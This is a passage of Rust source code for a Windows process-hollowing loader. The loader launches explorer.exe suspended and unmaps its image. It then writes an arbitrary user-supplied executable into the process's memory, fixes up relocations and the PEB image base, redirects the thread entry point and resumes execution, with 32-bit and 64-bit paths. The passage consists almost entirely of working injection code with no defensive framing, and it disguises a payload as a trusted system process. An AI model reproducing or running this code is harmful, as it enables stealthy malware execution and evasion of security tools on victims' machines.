                    (*entry).offset() as u64;

                let mut patched_address: u64 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut patched_address as *mut u64 as PVOID,
                    std::mem::size_of::<u64>(),
                    ptr::null_mut()
                );
            
                patched_address += delta;
            
                let mut write_result = 0;
                WriteProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &patched_address as *const u64 as PVOID, 
                    std::mem::size_of::<u64>(),
                    &mut write_result
                );

                if write_result == 0 {
                    return false;
                }
            }
        println!("[+] Relocation block processed at 0x{:X}", (*base_relocation).page_address);
    }
        println!("[+] Relocations processed successfully.");

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL;

        if GetThreadContext(process_info.hThread, &mut context) == 0 {
            println!("[-] An error occurred when trying to get the thread context.");
            return false;
        }

        // Update PEB with new image base
        if WriteProcessMemory(
            process_info.hProcess,
            (context.Rdx + 0x10) as PVOID,
            &alloc_address as *const PVOID as PVOID,
            std::mem::size_of::<u64>(),
            ptr::null_mut()
        ) == 0 {
            println!("[-] An error occurred when trying to write the image base in the PEB.");
            return false;
        }

        // Set new entry point
        context.Rcx = alloc_address as u64 + (*nt_headers).optional_header.address_of_entry_point as u64;

        if SetThreadContext(process_info.hThread, &context) == 0 {
            println!("[-] An error occurred when trying to set the thread context.");
            return false;
        }

        ResumeThread(process_info.hThread);
        true
    }
}

fn has_relocation32(buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) as *const ImageNtHeaders32;
        (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address != 0
    }
}

fn run_pereloc32(process_info: &winapi::um::processthreadsapi::PROCESS_INFORMATION,
    buffer: *const u8) -> bool {
    unsafe {
        let dos_header = buffer as *const ImageDosHeader;
        let nt_headers = (buffer as usize + (*dos_header).e_lfanew as usize) 
            as *mut ImageNtHeaders32;
            

        // Allocate memory in target process
        let alloc_address = VirtualAllocEx(
            process_info.hProcess,
            ptr::null_mut(),
            (*nt_headers).optional_header.size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if alloc_address.is_null() {
            println!("[-] An error occurred when trying to allocate memory for the new image.");
            return false;
        }
        println!("[+] Memory allocated at: {:p}", alloc_address);

        let delta_image_base = alloc_address as u32 - (*nt_headers).optional_header.image_base;
        println!("[+] Delta: 0x{:X}", delta_image_base);

        (*nt_headers).optional_header.image_base = alloc_address as u32;

        // Write PE headers
        let write_headers = WriteProcessMemory(
            process_info.hProcess,
            alloc_address,
            buffer as PVOID,
            (*nt_headers).optional_header.size_of_headers as usize,
            ptr::null_mut()
        );

        if write_headers == 0 {
            println!("[-] An error occurred when trying to write the headers of the new image.");
            return false;
        }
        println!("[+] Headers written at: {:p}", alloc_address);

        // Get relocation directory info and find relocation section
        let image_data_reloc = (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        let mut reloc_section = ptr::null_mut();

        // Write sections and identify relocation section
        for i in 0..(*nt_headers).file_header.number_of_sections {
            let section_header = (nt_headers as usize + 
                std::mem::size_of::<u32>() +  // Skip NT signature
                std::mem::size_of::<ImageFileHeader>() + 
                (*nt_headers).file_header.size_of_optional_header as usize + 
                (i as usize * std::mem::size_of::<ImageSectionHeader>())) as *const ImageSectionHeader;

            // Check if this is the relocation section
            if image_data_reloc.virtual_address >= (*section_header).virtual_address &&
               image_data_reloc.virtual_address < ((*section_header).virtual_address + (*section_header).virtual_size) {
                reloc_section = section_header as *mut ImageSectionHeader;
            }

            let write_section = WriteProcessMemory(
                process_info.hProcess,
                (alloc_address as usize + (*section_header).virtual_address as usize) as PVOID,
                (buffer as usize + (*section_header).pointer_to_raw_data as usize) as PVOID,
                (*section_header).size_of_raw_data as usize,
                ptr::null_mut()
            );

            if write_section == 0 {
                println!("[-] An error occurred when trying to write section: {}",
                    String::from_utf8_lossy(&(*section_header).name));
                return false;
            }
            println!("[+] Section {} written at: {:p}",
                String::from_utf8_lossy(&(*section_header).name),
                (alloc_address as usize + (*section_header).virtual_address as usize) as *const u8);
        }

        if reloc_section.is_null() {
            println!("[-] Failed to find relocation section.");
            return false;
        }

        println!("[+] Relocation section found: {}", 
            String::from_utf8_lossy(&(*reloc_section).name));

        // Process relocations
        let mut reloc_offset = 0u32;
        while reloc_offset < image_data_reloc.size {
            let base_relocation = (buffer as usize + 
                (*reloc_section).pointer_to_raw_data as usize + 
                reloc_offset as usize) as *const BaseRelocationBlock;
            
            reloc_offset += std::mem::size_of::<BaseRelocationBlock>() as u32;
            
            let entries = count_relocation_entries((*base_relocation).block_size);
            // println!("[+] Processing relocation block at VA: 0x{:X} with {} entries", 
                    //  (*base_relocation).page_address, entries);
            
            for _ in 0..entries {
                let entry = (buffer as usize + 
                    (*reloc_section).pointer_to_raw_data as usize + 
                    reloc_offset as usize) as *const BaseRelocationEntry;
                    
                reloc_offset += std::mem::size_of::<BaseRelocationEntry>() as u32;
                
                if (*entry).type_() == 0 {
                    continue;
                }
        
                // Calculate the actual address to patch relative to our new base
                let address_location = alloc_address as u32 + 
                    (*base_relocation).page_address + 
                    (*entry).offset() as u32;
                    
                // Read current value
                let mut original_value: u32 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut original_value as *mut u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                // Calculate new value based on relocation delta
                let patched_value = original_value + delta_image_base;
                
                // println!("[+] Relocation at 0x{:X} (VA: 0x{:X} + offset: 0x{:X})", 
                        // address_location,
                        // (*base_relocation).page_address,
                        // (*entry).offset());
                // println!("    Original: 0x{:X} -> Patched: 0x{:X}", original_value, patched_value);
                
                // Write patched value
                WriteProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &patched_value as *const u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                // Verify write
                let mut verify_value: u32 = 0;
                ReadProcessMemory(
                    process_info.hProcess,
                    address_location as PVOID,
                    &mut verify_value as *mut u32 as PVOID,
                    std::mem::size_of::<u32>(),
                    ptr::null_mut()
                );
                
                if verify_value != patched_value {
                    // println!("[-] Relocation verification failed at 0x{:X}", address_location);
                    // println!("    Expected: 0x{:X}, Got: 0x{:X}", patched_value, verify_value);
                    return false;  // Stop if verification fails
                }
            }
        }


println!("[+] Relocations processed successfully.");
// println!("[*] Process Handle: {:?}", process_info.hProcess);
// println!("[*] Thread Handle: {:?}", process_info.hThread);
// println!("[*] Buffer Address: {:p}", buffer);

let mut ctx: WOW64_CONTEXT = std::mem::zeroed();
ctx.ContextFlags = CONTEXT_FULL;
println!("[*] Getting WOW64 Thread Context");
let success = Wow64GetThreadContext(process_info.hThread, &mut ctx);
if success == 0 {
    println!("[-] Failed to get Thread Context. Error: {:#x}", GetLastError());
    return false;
}
println!("[+] Successfully got Thread Context");
// println!("[*] Thread Context EBX: {:#x}", ctx.Ebx);
let peb_image_base_offset = 0x8; // Offset to ImageBaseAddress in PEB
let peb_write_addr = (ctx.Ebx as usize + peb_image_base_offset) as PVOID;
let alloc_addr_u32 = alloc_address as u32;

// println!("[*] Writing new image base to PEB");
// println!("[*] PEB Write Address: {:p}", peb_write_addr);
// println!("[*] New Image Base: {:#x}", alloc_addr_u32);

let result = WriteProcessMemory(
    process_info.hProcess,
    peb_write_addr,
    &alloc_addr_u32 as *const u32 as PVOID,
    std::mem::size_of::<u32>(),
    ptr::null_mut()
);

if result == 0 {
    println!("[-] Failed to write PEB. Error: {:#x}", GetLastError());
    return false;
}
println!("[+] Successfully wrote new image base to PEB");

ctx.Eax = alloc_address as u32 + (*nt_headers).optional_header.address_of_entry_point;
println!("[*] Original entry point: {:#x}", (*nt_headers).optional_header.address_of_entry_point);
println!("[*] Setting EAX to new entry point: {:#x}", ctx.Eax);

let set_context = Wow64SetThreadContext(process_info.hThread, &ctx);
if set_context == 0 {
    println!("[-] Failed to set Thread Context. Error: {:#x}", GetLastError());
    return false;
}
println!("[+] Thread context set successfully");
let mut old_protect: DWORD = 0;
VirtualProtectEx(
    process_info.hProcess,
    alloc_address as PVOID,
    (*nt_headers).optional_header.size_of_image as SIZE_T,
    PAGE_EXECUTE_READWRITE,
    &mut old_protect
);
ResumeThread(process_info.hThread);
println!("[+] Thread resumed");
    
// println!("[*] Waiting for process to initialize...");

// Wait for process initialization (5 second timeout)
let wait_result = WaitForSingleObject(process_info.hProcess, 5000);
match wait_result {
    WAIT_OBJECT_0 => {
        // println!("[-] Process terminated prematurely");
        let mut exit_code: DWORD = 0;
        if GetExitCodeProcess(process_info.hProcess, &mut exit_code) != 0 {
            // println!("[-] Process exit code: {:#x}", exit_code);
        }
        return false;
    }
    WAIT_TIMEOUT => {
        // println!("[+] Process is still running");
        // Get current process status
        let mut exit_code: DWORD = 0;
        if GetExitCodeProcess(process_info.hProcess, &mut exit_code) != 0 {
            // println!("[*] Current process status code: {:#x}", exit_code);
        }
    }
    _ => {
        // println!("[-] Error waiting for process: {:#x}", GetLastError());
        return false;
    }
}
true   


}
}


fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("Usage: {} <file_path>", args[0]);
        return Ok(());
    }

    let input_file = &args[1];
    if !std::path::Path::new(input_file).exists() {
        println!("Input file does not exist!");
        return Ok(());
    }

    let mut file = File::open(input_file)?;
    let meta = file.metadata()?;
    let filesize = meta.len() as usize;

    let buffer = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            filesize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if buffer.is_null() {
        return Err(io::Error::last_os_error());
    }

    let mut file_contents = vec![0u8; filesize];
    file.read_exact(&mut file_contents)?;

    unsafe {
        ptr::copy_nonoverlapping(
            file_contents.as_ptr(),
            buffer as *mut u8,
            filesize,
        );
    }
    // let source_image = get_loaded_image(buffer);
    // let source_headers = get_nt_headers(buffer);

    // Create suspended process
    let mut source32=0;
    let source_magic = get_pe_magic(buffer as *const u8)?;
    if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        source32 = 1;
    }
    let process_name = if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        CString::new("C:\\Windows\\SysWOW64\\explorer.exe").unwrap()
    } else {
        CString::new("C:\\Windows\\explorer.exe").unwrap()
    };
    
    let mut startup_info: winapi::um::processthreadsapi::STARTUPINFOA = unsafe { mem::zeroed() };
startup_info.cb = mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32;

    let mut process_info: winapi::um::processthreadsapi::PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let success = unsafe {
        winapi::um::processthreadsapi::CreateProcessA(
            process_name.as_ptr(),  
            ptr::null_mut(),       
            ptr::null_mut(),       
            ptr::null_mut(),       
            true as i32,                      
            winapi::um::winbase::CREATE_SUSPENDED,
            ptr::null_mut(),        
            ptr::null_mut(),       
            &mut startup_info,      
            &mut process_info      
        )
    };

if success == 0 {
    return Err(io::Error::last_os_error());
}

    if source32 == 1 {
        println!("[+] Source is 32-bit PE");
        match get_process_address_information32(&process_info) {
            Some(info) => {
                if info.peb_address.is_null() || info.image_base_address.is_null() {
                    println!("[-] Failed to get process address information");
                    unsafe {
                        TerminateProcess(process_info.hProcess, 1);
                        VirtualFree(buffer, 0, MEM_RELEASE);
                    }
                    return Ok(());
                }
                if let Some(peb) = read_remote_peb(process_info.hProcess) {
                    println!("Successfully read process PEB");
                    println!("Image base address: {:p}", peb.image_base_address);
                    
                    let loaded_image = match read_remote_image32(process_info.hProcess, peb.image_base_address) {
                        Some(image) => {
                            println!("Successfully read remote image");
                            println!("Number of sections: {}", image.number_of_sections);
                            image
                        }
                        None => {
                            println!("Failed to read remote image");
                            return Ok(());
                        }
                    };
                }
                let has_reloc = has_relocation32(buffer as *const u8);

            if has_reloc{
            println!("[+] The source image has a relocation table");
            if run_pereloc32(&process_info, buffer as *const u8) {
                println!("[+] The injection has succeeded!");
                unsafe {
                    CloseHandle(process_info.hProcess);
                    CloseHandle(process_info.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
            }
            else {
            println!("[+] The source image doesn't have a relocation table");
            if run_pe32(&process_info, buffer as *const u8) {
                println!("[+] The injection has succeeded!");
                unsafe {
                    CloseHandle(process_info.hProcess);
                    CloseHandle(process_info.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
            }  

            }
            None => {
                println!("[-] Failed to get WOW64 context");
                unsafe {
                    TerminateProcess(process_info.hProcess, 1);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
        }

    }
    else {
        println!("64 BIT");
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();

    // Read target process PEB
    if let Some(peb) = read_remote_peb(process_info.hProcess) {
        println!("Successfully read process PEB");
        println!("Image base address: {:p}", peb.image_base_address);
        println!("PEB address {:p}", peb);

        let loaded_image = match read_remote_image(process_info.hProcess, peb.image_base_address) {
            Some(image) => {
                println!("Successfully read remote image");
                println!("Number of sections: {}", image.number_of_sections);
                image
            }
            None => {
                println!("Failed to read remote image");
                return Ok(());
            }
        };

        let source_magic = get_pe_magic(buffer as *const u8)?;
        if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            println!("Source PE is not 64-bit (Magic: 0x{:X})", source_magic);
            unsafe { VirtualFree(buffer, 0, MEM_RELEASE) };
            return Ok(());
        }

        let target_magic = read_remote_pe_magic(process_info.hProcess, peb.image_base_address)?;
        if target_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                println!("Target process is not 64-bit (Magic: 0x{:X})", target_magic);
                unsafe {
                    winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }

        println!("Both source and target are 64-bit PE files");

        let nt_unmap_view_of_section = match get_nt_unmap_view_of_section() {
            Some(func) => func,
            None => {
                println!("Failed to get NtUnmapViewOfSection function");
                return Ok(());
            }
        };
    
        // Unmap the section
        let result = unsafe {
            nt_unmap_view_of_section(
                process_info.hProcess,
                peb.image_base_address
            )
        };
    
        if result != 0 {
            println!("Error unmapping section: {}", result);
            return Ok(());
        }
    
        println!("Successfully unmapped section");

        let has_reloc = has_relocation64(buffer as *const u8);
        if !has_reloc {
            println!("[+] The source image doesn't have a relocation table.");
            if run_pe64(&process_info, buffer as *const u8) {
                println!("[+] The injection has succeeded!");
                // Clean up process
                unsafe {
                    CloseHandle(process_info.hProcess);
                    CloseHandle(process_info.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            } 
        }   
        else {
            println!("[+] The source image has a relocation table.");
            if run_pe_reloc64(&process_info, buffer as *const u8) {
                println!("[+] The injection has succeeded!");
                unsafe {
                    CloseHandle(process_info.hProcess);
                    CloseHandle(process_info.hThread);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
        }
        
        } 
    else {
        println!("Failed to read process PEB");
    }
}
    
    Ok(())
}